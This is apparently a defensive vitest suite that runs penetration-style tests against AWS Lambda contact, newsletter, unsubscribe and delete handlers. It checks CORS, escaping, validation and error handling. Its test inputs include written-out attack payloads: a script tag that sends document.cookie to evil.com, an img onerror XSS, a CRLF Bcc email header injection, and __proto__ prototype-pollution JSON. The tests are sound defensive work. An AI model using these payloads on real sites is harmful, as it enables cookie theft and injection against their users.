/**
 * Penetration tests for API handlers.
 *
 * These tests simulate common attack vectors against the Lambda endpoints
 * to verify that input validation, CORS, and error handling are robust.
 */
import type { APIGatewayProxyEventV2, APIGatewayProxyStructuredResultV2 } from 'aws-lambda';
import { describe, it, expect, vi, beforeEach } from 'vitest';
import { handler as contactHandler } from '../handlers/contact.ts';
import { handler as deleteHandler } from '../handlers/delete-data.ts';
import { handler as newsletterHandler } from '../handlers/newsletter.ts';
import { handler as unsubscribeHandler } from '../handlers/unsubscribe.ts';
import { createCaptchaProvider } from '../providers/captcha/index.ts';
import { createEmailProvider } from '../providers/email/index.ts';
import { createNewsletterStore } from '../providers/newsletter/index.ts';

vi.mock('../providers/captcha/index.ts', () => ({
  createCaptchaProvider: vi.fn(),
}));
vi.mock('../providers/email/index.ts', () => ({
  createEmailProvider: vi.fn(),
}));
vi.mock('../providers/newsletter/index.ts', () => ({
  createNewsletterStore: vi.fn(),
}));
vi.mock('../config.ts', () => ({
  getConfig: () => ({
    hcaptchaSecret: 'test-secret',
    newsletterTokenSecret: 'test-newsletter-secret',
    sesFromEmail: 'from@bool.pt',
    sesNotifyEmail: 'notify@bool.pt',
    sesContactList: 'test-list',
    corsAllowedOrigin: 'https://bool.pt',
  }),
}));

function makeEvent(
  body: unknown,
  overrides: Partial<APIGatewayProxyEventV2> = {}
): APIGatewayProxyEventV2 {
  return {
    body: typeof body === 'string' ? body : JSON.stringify(body),
    headers: { origin: 'https://bool.pt' },
    requestContext: { http: { sourceIp: '127.0.0.1' } },
    ...overrides,
  } as unknown as APIGatewayProxyEventV2;
}

function parseBody(result: APIGatewayProxyStructuredResultV2) {
  return JSON.parse(result.body as string);
}

describe('penetration tests', () => {
  const mockVerify = vi.fn();
  const mockSend = vi.fn();
  const mockSubscribe = vi.fn();

  beforeEach(() => {
    vi.clearAllMocks();
    vi.mocked(createCaptchaProvider).mockReturnValue({ verify: mockVerify });
    vi.mocked(createEmailProvider).mockReturnValue({ send: mockSend });
    vi.mocked(createNewsletterStore).mockReturnValue({
      subscribe: mockSubscribe,
      unsubscribe: vi.fn(),
      delete: vi.fn(),
    });
    mockVerify.mockResolvedValue({ success: true });
    mockSend.mockResolvedValue(undefined);
    mockSubscribe.mockResolvedValue(undefined);
  });

  // ───────────────────── CORS BYPASS ATTEMPTS ─────────────────────

  describe('CORS bypass attempts', () => {
    it('rejects attacker-controlled origin', async () => {
      const result = (await contactHandler(
        makeEvent(
          { name: 'Test', email: 'a@b.com', message: 'Hello world!!', captchaToken: 'tok' },
          { headers: { origin: 'https://evil.com' } }
        ),
        {} as never,
        {} as never
      )) as APIGatewayProxyStructuredResultV2;

      expect(result.headers?.['Access-Control-Allow-Origin']).toBe('https://bool.pt');
      expect(result.headers?.['Access-Control-Allow-Origin']).not.toBe('https://evil.com');
    });

    it('rejects subdomain spoofing', async () => {
      const result = (await contactHandler(
        makeEvent(
          { name: 'Test', email: 'a@b.com', message: 'Hello world!!', captchaToken: 'tok' },
          { headers: { origin: 'https://evil.bool.pt' } }
        ),
        {} as never,
        {} as never
      )) as APIGatewayProxyStructuredResultV2;

      expect(result.headers?.['Access-Control-Allow-Origin']).toBe('https://bool.pt');
    });

    it('rejects null origin', async () => {
      const result = (await contactHandler(
        makeEvent(
          { name: 'Test', email: 'a@b.com', message: 'Hello world!!', captchaToken: 'tok' },
          { headers: {} }
        ),
        {} as never,
        {} as never
      )) as APIGatewayProxyStructuredResultV2;

      expect(result.headers?.['Access-Control-Allow-Origin']).toBe('https://bool.pt');
    });

    it('rejects origin with trailing path', async () => {
      const result = (await contactHandler(
        makeEvent(
          { name: 'Test', email: 'a@b.com', message: 'Hello world!!', captchaToken: 'tok' },
          { headers: { origin: 'https://bool.pt/evil' } }
        ),
        {} as never,
        {} as never
      )) as APIGatewayProxyStructuredResultV2;

      expect(result.headers?.['Access-Control-Allow-Origin']).toBe('https://bool.pt');
    });
  });

  // ───────────────────── XSS / HTML INJECTION ─────────────────────

  describe('XSS / HTML injection', () => {
    it('escapes script tags in contact form name', async () => {
      await contactHandler(
        makeEvent({
          name: '<script>document.location="https://evil.com?c="+document.cookie</script>',
          email: 'attacker@test.com',
          message: 'Normal message here',
          captchaToken: 'tok',
        }),
        {} as never,
        {} as never
      );

      const html = (mockSend.mock.calls[0]?.[0] as { html: string }).html;
      expect(html).not.toContain('<script>');
      expect(html).toContain('&lt;script&gt;');
    });

    it('escapes img onerror payloads in message', async () => {
      await contactHandler(
        makeEvent({
          name: 'John',
          email: 'john@test.com',
          message: '<img src=x onerror=alert(1)> normal text',
          captchaToken: 'tok',
        }),
        {} as never,
        {} as never
      );

      const html = (mockSend.mock.calls[0]?.[0] as { html: string }).html;
      expect(html).not.toContain('<img');
      expect(html).toContain('&lt;img');
    });

    it('escapes event handler injection in phone', async () => {
      await contactHandler(
        makeEvent({
          name: 'John',
          email: 'john@test.com',
          message: 'Hello world!!',
          phone: '+1234567890" onmouseover="alert(1)',
          captchaToken: 'tok',
        }),
        {} as never,
        {} as never
      );

      // Phone should fail validation due to the regex, OR if it passes, be escaped
      // The phone regex /^\+?[\d\s\-().]{7,20}$/ should reject this
      const result = (await contactHandler(
        makeEvent({
          name: 'John',
          email: 'john@test.com',
          message: 'Hello world!!',
          phone: '+1234567890" onmouseover="alert(1)',
          captchaToken: 'tok',
        }),
        {} as never,
        {} as never
      )) as APIGatewayProxyStructuredResultV2;

      expect(result.statusCode).toBe(400);
    });

    it('escapes HTML entities in email subject', async () => {
      await contactHandler(
        makeEvent({
          name: '"><img src=x>',
          email: 'test@test.com',
          message: 'Hello world!!',
          captchaToken: 'tok',
        }),
        {} as never,
        {} as never
      );

      const subject = (mockSend.mock.calls[0]?.[0] as { subject: string }).subject;
      expect(subject).not.toContain('<img');
      expect(subject).toContain('&lt;img');
    });
  });

  // ───────────────────── EMAIL HEADER INJECTION ─────────────────────

  describe('email header injection', () => {
    it('rejects email with newline characters', async () => {
      const result = (await contactHandler(
        makeEvent({
          name: 'Attacker',
          email: 'test@test.com\r\nBcc: attacker@evil.com',
          message: 'Hello world!!',
          captchaToken: 'tok',
        }),
        {} as never,
        {} as never
      )) as APIGatewayProxyStructuredResultV2;

      expect(result.statusCode).toBe(400);
      expect(mockSend).not.toHaveBeenCalled();
    });

    it('rejects email with carriage return', async () => {
      const result = (await contactHandler(
        makeEvent({
          name: 'Attacker',
          email: 'test@test.com\rBcc: victim@example.com',
          message: 'Hello world!!',
          captchaToken: 'tok',
        }),
        {} as never,
        {} as never
      )) as APIGatewayProxyStructuredResultV2;

      expect(result.statusCode).toBe(400);
    });

    it('rejects email with null bytes', async () => {
      const result = (await contactHandler(
        makeEvent({
          name: 'Attacker',
          email: 'test@test.com\0extra',
          message: 'Hello world!!',
          captchaToken: 'tok',
        }),
        {} as never,
        {} as never
      )) as APIGatewayProxyStructuredResultV2;

      expect(result.statusCode).toBe(400);
    });
  });

  // ───────────────────── OVERSIZED PAYLOADS ─────────────────────

  describe('oversized payloads', () => {
    it('rejects body exceeding 64KB', async () => {
      const hugeMessage = 'A'.repeat(70_000);
      const result = (await contactHandler(
        makeEvent({
          name: 'Test',
          email: 'test@test.com',
          message: hugeMessage,
          captchaToken: 'tok',
        }),
        {} as never,
        {} as never
      )) as APIGatewayProxyStructuredResultV2;

      expect(result.statusCode).toBe(400);
      expect(parseBody(result).error).toBe('Request body too large');
    });

    it('rejects payload with many repeated fields', async () => {
      const bloatedPayload: Record<string, string> = {
        name: 'Test',
        email: 'test@test.com',
        message: 'Hello world!!',
        captchaToken: 'tok',
      };
      for (let i = 0; i < 5000; i++) {
        bloatedPayload[`extra_${i}`] = 'x'.repeat(10);
      }

      const result = (await contactHandler(
        makeEvent(bloatedPayload),
        {} as never,
        {} as never
      )) as APIGatewayProxyStructuredResultV2;

      expect(result.statusCode).toBe(400);
    });
  });

  // ───────────────────── PROTOTYPE POLLUTION ─────────────────────

  describe('prototype pollution via JSON body', () => {
    it('does not pollute Object prototype via __proto__', async () => {
      const malicious =
        '{"name":"Test","email":"test@test.com","message":"Hello world!!","captchaToken":"tok","__proto__":{"isAdmin":true}}';

      await contactHandler(makeEvent(malicious), {} as never, {} as never);

      // Verify prototype was not polluted
      expect(({} as Record<string, unknown>).isAdmin).toBeUndefined();
    });

    it('does not pollute via constructor.prototype', async () => {
      const malicious =
        '{"name":"Test","email":"test@test.com","message":"Hello world!!","captchaToken":"tok","constructor":{"prototype":{"polluted":true}}}';

      await contactHandler(makeEvent(malicious), {} as never, {} as never);

      expect(({} as Record<string, unknown>).polluted).toBeUndefined();
    });
  });

  // ───────────────────── CAPTCHA BYPASS ATTEMPTS ─────────────────────

  describe('captcha bypass attempts', () => {
    it('rejects empty captcha token', async () => {
      const result = (await contactHandler(
        makeEvent({
          name: 'Test',
          email: 'test@test.com',
          message: 'Hello world!!',
          captchaToken: '',
        }),
        {} as never,
        {} as never
      )) as APIGatewayProxyStructuredResultV2;

      expect(result.statusCode).toBe(400);
    });

    it('rejects missing captcha token', async () => {
      const result = (await contactHandler(
        makeEvent({
          name: 'Test',
          email: 'test@test.com',
          message: 'Hello world!!',
        }),
        {} as never,
        {} as never
      )) as APIGatewayProxyStructuredResultV2;

      expect(result.statusCode).toBe(400);
    });

    it('does not process form when captcha fails', async () => {
      mockVerify.mockResolvedValue({ success: false });

      const result = (await contactHandler(
        makeEvent({
          name: 'Test',
          email: 'test@test.com',
          message: 'Hello world!!',
          captchaToken: 'fake-token',
        }),
        {} as never,
        {} as never
      )) as APIGatewayProxyStructuredResultV2;

      expect(result.statusCode).toBe(403);
      expect(mockSend).not.toHaveBeenCalled();
    });

    it('does not subscribe when newsletter captcha fails', async () => {
      mockVerify.mockResolvedValue({ success: false });

      const result = (await newsletterHandler(
        makeEvent({ email: 'test@test.com', captchaToken: 'fake' }),
        {} as never,
        {} as never
      )) as APIGatewayProxyStructuredResultV2;

      expect(result.statusCode).toBe(403);
      expect(mockSend).not.toHaveBeenCalled();
    });
  });

  // ───────────────────── MALFORMED INPUT ─────────────────────

  describe('malformed input handling', () => {
    it('rejects non-JSON body', async () => {
      const result = (await contactHandler(
        makeEvent('not json at all'),
        {} as never,
        {} as never
      )) as APIGatewayProxyStructuredResultV2;

      expect(result.statusCode).toBe(400);
      expect(parseBody(result).error).toBe('Invalid JSON in request body');
    });

    it('rejects array body', async () => {
      const result = (await contactHandler(
        makeEvent([1, 2, 3]),
        {} as never,
        {} as never
      )) as APIGatewayProxyStructuredResultV2;

      expect(result.statusCode).toBe(400);
    });

    it('rejects null body', async () => {
      const result = (await contactHandler(
        makeEvent(null, { body: undefined }),
        {} as never,
        {} as never
      )) as APIGatewayProxyStructuredResultV2;

      expect(result.statusCode).toBe(400);
    });

    it('rejects numeric types for string fields', async () => {
      const result = (await contactHandler(
        makeEvent({
          name: 12345,
          email: 'test@test.com',
          message: 'Hello world!!',
          captchaToken: 'tok',
        }),
        {} as never,
        {} as never
      )) as APIGatewayProxyStructuredResultV2;

      expect(result.statusCode).toBe(400);
    });
  });

  // ───────────────────── ERROR INFORMATION LEAKAGE ─────────────────────

  describe('error information leakage', () => {
    it('does not expose stack traces on provider error', async () => {
      mockVerify.mockResolvedValue({ success: true });
      mockSend.mockRejectedValue(
        new Error('AWS SDK internal: credentials expired at /node_modules/...')
      );

      const result = (await contactHandler(
        makeEvent({
          name: 'Test',
          email: 'test@test.com',
          message: 'Hello world!!',
          captchaToken: 'tok',
        }),
        {} as never,
        {} as never
      )) as APIGatewayProxyStructuredResultV2;

      const body = parseBody(result);
      expect(result.statusCode).toBe(500);
      expect(body.error).toBe('Internal server error');
      expect(body.error).not.toContain('AWS');
      expect(body.error).not.toContain('credentials');
      expect(body.error).not.toContain('node_modules');
    });

    it('does not expose stack traces on newsletter error', async () => {
      mockVerify.mockResolvedValue({ success: true });
      mockSend.mockRejectedValue(new Error('SES rate limit: account in sandbox'));

      const result = (await newsletterHandler(
        makeEvent({ email: 'test@test.com', captchaToken: 'tok' }),
        {} as never,
        {} as never
      )) as APIGatewayProxyStructuredResultV2;

      const body = parseBody(result);
      expect(result.statusCode).toBe(500);
      expect(body.error).toBe('Internal server error');
      expect(body.error).not.toContain('SES');
    });

    it('validation errors do not expose internal schema details', async () => {
      const result = (await contactHandler(
        makeEvent({ email: 'bad' }),
        {} as never,
        {} as never
      )) as APIGatewayProxyStructuredResultV2;

      const body = parseBody(result);
      expect(result.statusCode).toBe(400);
      expect(body.error).not.toContain('ZodError');
      expect(body.error).not.toContain('stack');
    });
  });

  // ───────────────────── UNSUBSCRIBE / DELETE ABUSE ─────────────────────

  describe('unsubscribe and delete abuse prevention', () => {
    it('rejects unsubscribe with invalid email', async () => {
      const result = (await unsubscribeHandler(
        makeEvent({ email: 'not-an-email' }),
        {} as never,
        {} as never
      )) as APIGatewayProxyStructuredResultV2;

      expect(result.statusCode).toBe(400);
    });

    it('rejects delete with invalid email', async () => {
      const result = (await deleteHandler(
        makeEvent({ email: 'not-an-email' }),
        {} as never,
        {} as never
      )) as APIGatewayProxyStructuredResultV2;

      expect(result.statusCode).toBe(400);
    });

    it('does not leak whether email exists on unsubscribe', async () => {
      const mockUnsub = vi.fn().mockResolvedValue(undefined);
      vi.mocked(createNewsletterStore).mockReturnValue({
        subscribe: vi.fn(),
        unsubscribe: mockUnsub,
        delete: vi.fn(),
      });

      const result = (await unsubscribeHandler(
        makeEvent({ email: 'nonexistent@test.com' }),
        {} as never,
        {} as never
      )) as APIGatewayProxyStructuredResultV2;

      // Should return 200 regardless of whether email exists
      expect(result.statusCode).toBe(200);
    });
  });
});
